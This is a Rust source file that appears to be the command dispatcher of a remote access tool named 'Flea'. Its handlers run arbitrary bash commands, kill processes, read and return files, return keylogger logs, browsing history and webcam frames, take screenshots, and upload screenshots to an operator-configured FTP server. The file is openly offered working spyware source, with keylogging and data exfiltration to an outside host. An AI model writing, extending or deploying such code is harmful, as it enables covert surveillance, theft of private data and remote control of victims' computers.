extern crate ftp;
extern crate repng;
extern crate serde;

use serde::{Serialize, Deserialize};
use std::sync::{Arc, Mutex};
use std::{str, env, path::PathBuf};
use log::{debug, error};
use chrono::{DateTime, Utc};
use crate::fileserver::FileServer;
use crate::{ftp::*, screenshot::Screenshot};
use crate::{systemcmd::*, browserhistory};
#[cfg(feature = "camera")]
use crate::camera;
use crate::keylogger::*;

const FLEA_PROTOCOL_VERSION: u8 = 1;
const GET_VERSION_COMMAND: &str = "version";
const EXECUTE_BASH_COMMAND: &str = "bash";
const SEND_PIC_COMMAND: &str = "ftpscreenshot";
const GET_SCREENSHOT_COMMAND: &str = "screenshot";
const SEND_KEY_LOGGER_FILE_COMMAND: &str = "log";
const SEND_PROCESS_LIST_COMMAND: &str = "proclist";
const KILL_COMMAND: &str = "kill";
const UPLOAD_COMMAND: &str = "upload";
const DIR_COMMAND: &str = "dir";
const GET_FILE_COMMAND: &str = "getfile";
const CHANGE_DIRECTORY_COMMAND: &str = "cd";
const FTP_PARAM_COMMAND: &str = "setftp";
const BROWSING_HISTORY_COMMAND: &str = "history";
const GET_SYSTEM_INFO_COMMAND: &str = "sysinfo";
const GET_WORKING_DIR_COMMAND: &str = "pwd";
const RESTART_COMMAND: &str = "restart";
const LOCK_SCREEN_COMMAND: &str = "lockscreen";
pub const STOP_COMMAND: &str = "quit";
const UNKNOWN_COMMAND: &str = "Unknown command";

pub const RESTART_FILENAME: &str = "flea.rst";

#[cfg(feature = "camera")]
const GET_CAMERA_FRAME_COMMAND: &str = "camera";


//Enter your data for FTP Server connection
const FTP_USER_NAME: &str = "enter_ftp_user_name";
const FTP_PASS_NAME: &str = "enter_ftp_user_password";
const FTP_ADDRESS_NAME: &str = "enter_ftp_server_ip_address";
const FTP_FOLDER_NAME: &str = "Files";

pub trait FleaCommand
{
    fn new() -> Self;
    fn process(&mut self, cmd: &str, value: &str, file_server: &Arc<Mutex<FileServer>>) -> String;
}

#[derive(Serialize, Deserialize)]
struct FleaConfig 
{
    ftp_user: String,
    ftp_pass: String,
    ftp_address: String,
    ftp_folder: String,
}

pub struct CommandProcessor
{
    version: u8,
    current_directory: PathBuf,
    conf: FleaConfig,
    ftp: FTP,
    screenshot: Screenshot,
    os: SystemCmd,
}

/* Default values will be saved in a Flea configuration file when the file not exists yet.
    After that you should modify the file to set up your own values or enter your values
    in the constants defined above*/
impl ::std::default::Default for FleaConfig 
{
    fn default() -> Self 
    { 
        Self 
        { 
            ftp_address: FTP_ADDRESS_NAME.into(), 
            ftp_pass: FTP_PASS_NAME.into(), 
            ftp_user: FTP_USER_NAME.into(),
            ftp_folder: FTP_FOLDER_NAME.into()
        } 
    }
}

impl CommandProcessor
{    
    /// Gets a temporary directory path for a screenshot file
    /// * Returns a path to a temporary directory with a screenshot filename which is a unique name
    fn get_temp_dir(&self) -> PathBuf
    {
        let now: DateTime<Utc> = Utc::now();
        let file_name = format!("screenshot{}.png", now.format("%Y-%m-%d_%H-%M-%S"));
        env::temp_dir().as_path().join(file_name)
    }

    /// Convert a byte array into string digits
    /// * data - a byte array to convert
    /// * returns a string with digits
    /// * Example: [0x01, 0x02, 0x03] -> "010203"
    fn bytes_to_string(&self, data: &[u8]) -> String
    {
        let mut s = String::new();
        for b in data
        {
            s.push_str(&format!("{:02x}", b));
        }
        s
    }

    /// Converts string vector to String seperated with a new line
    /// * data - a vector of strings to convert
    /// * returns a string with a new line seperator
    /// * Example: ["a", "b", "c"] -> "a
    /// b
    /// c"
    /// * Example: [] -> ""
    fn vec_to_string(&self, data: &Vec<String>) -> String
    {
        let mut s = String::new();
        for d in data
        {
            s.push_str(&format!("{}\r\n", d));
        }

        s
    }

    fn change_directory(&mut self, value: &str, file_server: &Arc<Mutex<FileServer>>) -> String
    {
        if value == ".." 
        {
            match file_server.lock().unwrap().change_directory_up()
            {
                Ok(_) =>
                {
                    debug!("Directory changed");
                    "Directory changed".to_string()
                },
                Err(x) =>
                {
                    error!("Error: {}", x);
                    x
                }
            }
        }
        else if value.is_empty()
        {
            debug!("Directory name is empty");
            return "Directory name is empty".to_string();
        }
        else
        {
            match file_server.lock().unwrap().change_directory(value)
            {
                Ok(_) =>
                {
                    debug!("Directory changed");
                    return "Directory changed".to_string();
                },
                Err(x) =>
                {
                    error!("Error: {}", x);
                    return x;
                }
            }
        }
    }

    fn set_ftp_params(&mut self, value: &str) -> String
    {
        let ftp_params: Vec<&str> = value.split(';').collect();
        if ftp_params.len() != 3
        {
            return "Wrong number of parameters".to_string();
        }

        self.conf.ftp_address = ftp_params[0].to_string();
        self.conf.ftp_user = ftp_params[1].to_string();
        self.conf.ftp_pass = ftp_params[2].to_string();
        self.conf.ftp_folder = FTP_FOLDER_NAME.to_string();

        match confy::store("flea_conf", None, &self.conf)
        {
            Ok(_) =>
            {
                "Ok".to_string()
            },
            Err(x) =>
            {
                x.to_string()
            }
        }
    }

    /// Create a restart file
    /// # Arguments
    /// * 'file_name' - A file name to create
    /// # Returns
    /// * `Result<(), String>` - Result of the operation
    pub(crate) fn create_restart_file(&self, file_name: &str) -> Result<(), String>
    {
        let mut path = self.current_directory.clone();
        debug!("Current directory: {:?}", path);

        path.push(file_name);
        match std::fs::File::create(path)
        {
            Ok(_) =>
            {
                Ok(())
            },
            Err(e) =>
            {
                Err(e.to_string())
            }
        }
    }

    #[cfg(feature = "camera")]
    fn get_camera_frame(&self, file_server: &Arc<Mutex<FileServer>>) -> String
    {
        let tmp_path = env::temp_dir();

        match camera::save_camera_frames(1, &tmp_path.to_str().unwrap().to_string())
        {
            Ok(_) =>
            {
                debug!("Frame captured");
                #[cfg(target_os = "linux")]
                let frame_file = tmp_path.join(format!("{}0.jpg", camera::FRAME_FILE_NAME));

                #[cfg(target_os = "windows")]
                let frame_file = tmp_path.join(format!("{}0.wmv", camera::FRAME_FILE_NAME));
                return match file_server.lock().unwrap().read_binary_file_by_path(&frame_file)
                {
                    Ok(x) =>
                    {
                        let ret = self.bytes_to_string(&x);
                        if let Err(y) = std::fs::remove_file(frame_file) 
                        {
                            error!("Couldn't remove a file: {}", y.to_string());
                            ret
                        } 
                        else 
                        {
                            debug!("Captured frame removed");
                            ret
                        }
                    },
                    Err(x) =>
                    {
                        error!("Error (video couldn't be read or camera is not available): {}", x);
                        return x.to_string()
                    }
                };
            }
            Err(x) =>
            {
                error!("Error: {}", x);
                return x;
            }
        }
    }
}

impl FleaCommand for CommandProcessor
{
    fn new() -> Self
    {
        debug!("Creating FleaCommand..");

        let cr = match env::current_dir() 
        {
            Ok(x) =>
            {
                x
            },
            Err(y) =>
            {
                panic!("Couldn't get current directory: {}", y)
            }
        };

        Self 
        { 
            version: FLEA_PROTOCOL_VERSION,

            conf: match confy::load("flea_conf", None)
            {
                Ok(x) =>
                {
                    x
                },
                Err(e) =>
                {
                    panic!("Configuration error {}", e)
                }
            },
            
            current_directory: cr.clone(),
            ftp: FTP::new(cr),
            screenshot: Screenshot::new(),
            os: SystemCmd::new(),
        }
    }
    
    /// A routine for processing incoming commands
    /// * cmd - a command in a form of a string
    /// * value - an additional data related to a command
    /// TODO: Modify this function into a hashmap with string names and function pointers
    /// e.g.
    /// ```
    /// use std::collections::HashMap;
    /// type Ihello = dyn Fn() -> String;
    /// fn hello() -> String {
    ///     "HELLO".to_string()
    /// }
    /// fn main() {
    ///     let mut map: HashMap<&str, Box<Ihello>> = HashMap::new();    
    ///     map.insert("hello", Box::new(hello));    
    ///     println!("{}", map.get("hello").unwrap()());
    /// }
    /// ```
    fn process(&mut self, cmd: &str, value: &str, file_server: &Arc<Mutex<FileServer>>) -> String
    {        
        match cmd
        {
            GET_VERSION_COMMAND =>
            {
                self.version.to_string()
            },

            EXECUTE_BASH_COMMAND =>
            {
                self.os.execute_bash_command(value)
            },

            KILL_COMMAND =>
            {
                self.os.kill_process(value)
            },

            UPLOAD_COMMAND =>
            {
                match self.ftp.receive_file_from_ftp(&self.conf.ftp_address, &self.conf.ftp_user, &self.conf.ftp_pass, value, &self.conf.ftp_folder)
                {
                    Ok(_) =>
                    {
                        "File uploaded".to_string()
                    },
                    Err(x) =>
                    {
                        x.to_string()
                    }
                }
            },

            SEND_KEY_LOGGER_FILE_COMMAND =>
            {
                let current_path = self.current_directory.join(KEY_LOGGER_FILE_NAME).to_str().unwrap().to_string();
                get_key_logger_content(&current_path)
            },

            SEND_PROCESS_LIST_COMMAND =>
            {
                self.os.get_process_list()
            },

            CHANGE_DIRECTORY_COMMAND =>
            {
                self.change_directory(value, file_server)
            },

            DIR_COMMAND =>
            {
                if let Ok(files) = file_server.lock().unwrap().list_content()
                {
                    debug!("Directory content returned");
                    self.vec_to_string(&files)
                }
                else 
                {
                    debug!("Couldn't get files");
                    "Couldn't get files".to_string()
                }
            },

            GET_FILE_COMMAND =>
            {
                return match file_server.lock().unwrap().read_binary_file(value)
                {
                    Ok(x) =>
                    {
                        debug!("File returned");
                        self.bytes_to_string(&x)
                    },
                    Err(x) =>
                    {
                        error!("Error: {}", x);
                        x.to_string()
                    }
                }
            },

            GET_SCREENSHOT_COMMAND =>
            {
                let current_path = self.get_temp_dir();
                match self.screenshot.take_screenshot(current_path.to_str().unwrap()) 
                {
                    Ok(x) =>
                    {
                        x
                    },
                    Err(x) =>
                    {
                        return x
                    }
                };

                return match file_server.lock().unwrap().read_binary_file_by_path(&current_path)
                {
                    Ok(x) =>
                    {
                        let ret = self.bytes_to_string(&x);
                        if let Err(y) = std::fs::remove_file(current_path) 
                        {
                            error!("Couldn't remove a file: {}", y.to_string());
                            ret
                        } 
                        else 
                        {
                            ret
                        }
                    },
                    Err(x) =>
                    {
                        return x.to_string()
                    }
                }
            },

            SEND_PIC_COMMAND =>
            {
                let current_path = self.get_temp_dir();
                match self.screenshot.take_screenshot(current_path.to_str().unwrap()) 
                {
                    Ok(x) =>
                    {
                        x
                    },
                    Err(x) =>
                    {
                        return x
                    }
                };

                match self.ftp.send_file_to_ftp(&self.conf.ftp_address, &self.conf.ftp_user, 
                    &self.conf.ftp_pass, &current_path, &self.conf.ftp_folder)
                {
                    Ok(_) =>
                    {
                        match std::fs::remove_file(current_path)
                        {
                            Ok(_) =>
                            {
                                debug!("A temporary file removed.");
                            },
                            Err(_) =>
                            {
                                error!("Couldn't remove a temp file!");
                            }
                        }

                        "Ok".to_string()
                    },
                    Err(x) =>
                    {
                        x.to_string()
                    }
                }    
            },

            FTP_PARAM_COMMAND =>
            {
                self.set_ftp_params(value)
            },
            
            BROWSING_HISTORY_COMMAND =>
            {
                match browserhistory::get_browsing_history()
                {
                    Ok(x) =>
                    {
                        self.vec_to_string(&x)
                    },
                    Err(x) =>
                    {
                        x.to_string()
                    }
                }
            },

            #[cfg(feature = "camera")]
            GET_CAMERA_FRAME_COMMAND =>
            {
                self.get_camera_frame(file_server)
            },

            GET_SYSTEM_INFO_COMMAND =>
            {
                self.os.get_system_info()
            },
            
            GET_WORKING_DIR_COMMAND =>
            {
                file_server.lock().unwrap().get_dir()
            },

            LOCK_SCREEN_COMMAND =>
            {
                self.os.lock_screen();
                "Ok".to_string()
            },

            RESTART_COMMAND =>
            {
                match self.create_restart_file(RESTART_FILENAME)
                {
                    Ok(_) =>
                    {
                        debug!("Restart file created");
                        STOP_COMMAND.to_string()
                    },
                    Err(x) =>
                    {
                        error!("Error: {}", x);
                        x
                    }
                }
            },

            STOP_COMMAND =>
            {
                STOP_COMMAND.to_string()
            },

            &_ =>
            {                
                UNKNOWN_COMMAND.to_string()
            }
        }
    }
}
